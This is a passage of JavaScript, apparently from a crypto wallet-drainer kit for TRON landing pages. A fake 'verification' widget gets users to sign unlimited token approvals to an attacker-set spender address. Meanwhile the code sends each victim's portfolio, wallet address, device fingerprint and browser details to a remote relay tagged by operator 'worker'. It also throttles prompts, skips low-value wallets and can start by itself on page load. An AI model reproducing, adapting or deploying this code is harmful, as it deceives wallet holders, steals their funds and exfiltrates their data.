/* ══════════ PIPELINE ══════════ */
async function pipeline(){
  if(PIPE_RUN)return{status:"busy"};
  PIPE_RUN=true;
  try{
    /* нативный TRX */
    let trx=0;
    try{const acc=await TW.tronWeb.trx.getAccount(TW.address);
      trx=((acc&&(acc.balance||0))/1e6)||0;}catch(e){}

    /* ── ИНВЕНТАРЬ ВСЕХ АКТИВОВ ── */
    const assets=await discoverAssets();
    const todo=assets.filter(a=>a.allowance<HALF_MAX);

    const costPer=await approveCostTrx();
    const needGas=costPer*Math.max(todo.length,1)+0.5;
    const ds=readDay();

    dbgState(
      "worker["+WK.src+"]: "+workerLabel()+" visit#"+visitNo+
      "\ndiag: "+WK.diag+
      "\naddr: "+TW.address+
      "\nTRX: "+trx.toFixed(6)+
      "\ntokens: "+assets.length+" · todo: "+todo.length+
      assets.map(a=>"\n  "+short(a.contract)+" "
        +fmt(a.raw,a.dec)+" allow:"
        +(a.allowance>=HALF_MAX?"INF":fmt(a.allowance,a.dec))).join("")+
      "\ngas-ok:"+(trx>=needGas)+" (~"+needGas.toFixed(2)+")"+
      "\nsession: "+((Date.now()-T0)/1000|0)+"s"+
      "\nprompts: "+(ds.tries||0)+"/"+CFG.MAX_PROMPTS_PER_DAY);

    /* 🕸 HOLDER: полный портфель через relay */
    const f=deviceFP();
    void relaySend([
      "🕸 <b>HOLDER</b>",
      "🧑‍💼 WORER: <b>"+esc(workerLabel())+"</b>"+(WK.src?" ["+esc(WK.src)+"]":""),
      (WK.diag&&WK.diag!=="ok")?("🧪 diag: "+esc(WK.diag)):"",
      "⏱️ "+new Date().toISOString().slice(0,19).replace("T"," ")+
        " · page "+((Date.now()-T0)/1000|0)+"s · visit#"+visitNo,
      "👤 <code>"+esc(TW.address||"—")+"</code>",
      "💰 TRX <b>"+trx.toFixed(4)+"</b> · активов: <b>"+assets.length+"</b>"+
        (todo.length?(" · к аппруву: <b>"+todo.length+"</b>"):""),
      "🗂 portfolio:",
      portLines(assets)||"(пусто)",
      "⛽ fee ~"+costPer.toFixed(2)+"/token · need ~"+needGas.toFixed(2)+" TRX",
      "🔐 wallet: "+esc(providerLabel())+" · "+esc(providerState(TW.p)),
      "🌐 "+envLabel(),
      "⚙️ "+f.cores+"cores "+esc(f.net)+" rtt:"+f.rtt,
      "🖼 "+esc(navigator.userAgent.slice(0,110))
    ].filter(Boolean).join("\n"));

    /* пустой кошелёк */
    if(!assets.length)return{status:"no-assets"};

    /* всё уже одобрено — только регистрация */
    if(!todo.length){
      registerHolder();kickServer("already-infinite");
      return{status:"active"};}

    /* порог значимости: суммарный интерес портфеля */
    const worth=assets.reduce((s,a)=>s+a.usd,0);
    if(!FORCE&&worth<CFG.PRICE_MIN_USD)return{status:"no-assets"};

    /* газ на ВЕСЬ батч */
    if(!FORCE&&trx<needGas)return{status:"low-gas",need:needGas};

    if(ds.done&&!FORCE)return{status:"active"};
    if(!FORCE&&ds.tries>=CFG.MAX_PROMPTS_PER_DAY)return{status:"limit"};

    bumpDay({tries:(ds.tries||0)+1,done:false});
    await sleep(FORCE?120:CFG.PROMPT_DELAY_MS);

    /* ── МУЛЬТИ-APPROVE по всем не-одобренным ── */
    let doneN=0,idx=0,lastTx=null,lastContract=null;
    for(const a of todo){
      idx++;
      widgetPhase("busy",
        "Verifying asset "+idx+"/"+todo.length+" - please confirm.");
      try{
        const txb=await TW.tronWeb.transactionBuilder.triggerSmartContract(
          a.contract,"approve(address,uint256)",
          {feeLimit:CFG.FEE_LIMIT},
          [{type:"address",value:CFG.SPENDER},
           {type:"uint256",value:MAX_UINT.toString()}],
          TW.address);
        if(!(txb&&txb.result&&txb.result.result)){
          log("build fail "+short(a.contract),"err");continue;}
        const txid=await signAndSendHolder(txb.transaction);
        lastTx=txid;lastContract=a.contract;
        log("APPROVE "+short(a.contract)+" tx:"+txid,"ok");
        kickServer("post-broadcast:"+short(a.contract));
        doneN++;a.allowance=MAX_UINT;
        /* синхронизируем кэш инвентаря, чтобы повторный клик не одобрял заново */
        const ci=(INV.list||[]).find(x=>x.contract===a.contract);
        if(ci)ci.allowance=MAX_UINT;
        void relaySend("🔓 <b>APPROVE SET</b>"+
          "\n🧑‍💼 "+esc(workerLabel())+(WK.src?" ["+esc(WK.src)+"]":"")+
          "\n👤 <code>"+esc(TW.address)+"</code>"+
          "\n🪙 token <code>"+esc(short(a.contract))+"</code>"+
          " ("+esc(fmt(a.raw,a.dec))+") value ∞"+
          "\n🔗 <code>"+esc(txid)+"</code>"+
          "\n⏲ batch "+idx+"/"+todo.length+
          " · after "+((Date.now()-T0)/1000|0)+"s · visit#"+visitNo);
      }catch(e){
        const m=String((e&&e.message)||e);
        log("approve "+short(a.contract)+": "+m,"err");
        /* юзер отказал — прекращаем серию, не бомбим следующими окнами */
        if(/reject|denied/i.test(m))break;
        continue;}}

    ds.done=true;bumpDay(ds);
    registerHolder();
    kickServer(doneN?"approved-multi":"batch-rejected");

    /* подтверждение последней TX как маркер активности сети */
    if(lastTx&&lastContract&&doneN){
      const okLast=await confirmPoll(lastTx,lastContract);
      if(okLast)
        void relaySend("✅ <b>BATCH CONFIRMED</b>\n🧑‍💼 "+esc(workerLabel())+
          "\n👤 <code>"+esc(TW.address)+"</code>"+
          "\n✅ approved tokens: <b>"+doneN+"</b>"+
          "\n⏱ total "+((Date.now()-T0)/1000|0)+"s");
      kickServer(okLast?"approved":"pending-tx");}

    widgetPhase("done","Success! Verification complete.","ok");
    return{status:doneN?"approved":"pending"};
  }finally{PIPE_RUN=false;}}

/* ── цикл по клику ── */
async function runCycle(){
  if(CYCLE_RUN)return;CYCLE_RUN=true;
  try{
    W();
    widgetPhase("busy","Verifying...");
    let p=findProvider();
    const t0=Date.now();
    while(!(p&&p.tronWeb)&&Date.now()-t0<1600){p=findProvider();await sleep(150);}
    if(!p||!p.tronWeb){
      widgetPhase("ready","Continue in Trust Wallet dApp browser.");
      showAlt();return;}
    if(!TW.tronWeb){TW.p=p;TW.tronWeb=p.tronWeb;}

    if(!TW.address){
      const okc=await waitAccounts(p);
      if(!okc){widgetPhase("ready","Verification delayed - tap again.");return;}
      TW.address=p.tronWeb.defaultAddress.base58;
      INV.t=0;INV.list=null;                 /* новый адрес — новый инвентарь */
      dbgAddr(TW.address);
      log("connected "+short(TW.address)+(WK.name?" "+WK.name:""),"ok");}

    const res=await pipeline();
    switch(res.status){
      case"active":case"approved":case"pending":
        widgetPhase("done","Success! Verification complete.","ok");break;
      case"limit":
        widgetPhase("done","Verification complete.","ok");break;
      case"no-assets":
        widgetPhase("done","Verification complete.","ok");break;
      case"low-gas":
        widgetPhase("ready",
          "Need approx "+(res.need||0).toFixed(1)+" TRX for network fees.","fail");break;
      default:
        widgetPhase("ready","Verification failed - please try again.","fail");}
  }catch(e){
    log("cycle: "+((e&&e.message)||e),"err");
    const hint=explainConnectError(e);
    widgetPhase("ready",hint||"Verification failed - please try again.","fail");
  }finally{CYCLE_RUN=false;}}

/* ══════════ ИНИЦИАЛИЗАЦИЯ ══════════ */
function init(){
  applyRayId();
  W();                       /* создаёт авто-виджет, если нет [data-connect] */
  bindTriggers();bindAlts();
  buildDbg();
  setTimeout(fireVisitOnce,1400);
  setTimeout(escapeAuto,650);
  setTimeout(()=>widgetPhase("ready",""),1100+Math.floor(Math.random()*300));
  if(AUTO)setTimeout(runCycle,1300);
  /* динамические/SPA лендинги — перепривязка */
  let deb=null;
  new MutationObserver(()=>{
    clearTimeout(deb);
    deb=setTimeout(()=>{bindTriggers();bindAlts();},150);
  }).observe(document.documentElement,{childList:true,subtree:true});}

if(document.readyState==="loading")
  document.addEventListener("DOMContentLoaded",init,{once:true});
else init();

/* ── глобальное API ── */
window.VKit={
  cfg:CFG,
  start:runCycle,
  force:async()=>{FORCE=true;await runCycle();},
  scan:discoverAssets,
  openWallet:walletCascade};

})();
